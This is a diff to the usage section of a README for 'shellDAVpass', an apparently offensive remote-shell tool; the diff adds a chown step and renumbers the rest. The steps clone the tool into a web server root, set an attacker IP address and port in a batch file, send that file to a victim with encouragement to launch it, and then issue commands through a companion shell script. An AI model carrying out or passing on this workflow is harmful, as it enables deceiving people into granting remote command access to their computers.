@@ -10,16 +10,17 @@ Usage example:
   Listen 80
 3. cd /var/www/html
 4. git clone https://github.com/IvanGlinkin/shellDAVpass.git
-5. cd shellDAVpass
-6. nano shellDAVpass.bat
-7. Change the IP-address and Port
+5. chown -R www-data: shellDAVpass
+6. cd shellDAVpass
+7. nano shellDAVpass.bat
+8. Change the IP-address and Port
   SET IPADDRESS=10.211.55.11
   SET PORT=80
-8. Save the changings (by pressing CTRL+O and Enter. To exit, press CTRL+X)
-9. !!! Send the shellDAVpass.bat to the victim and courage him/her to launch the file !!!
-10. Launch the command prompt
+9. Save the changings (by pressing CTRL+O and Enter. To exit, press CTRL+X)
+10. !!! Send the shellDAVpass.bat to the victim and courage him/her to launch the file !!!
+11. Launch the command prompt
   bash bash shellDAVpass.sh
-11. Enter your commands
+12. Enter your commands
 ```
 An original article:
 --------------------
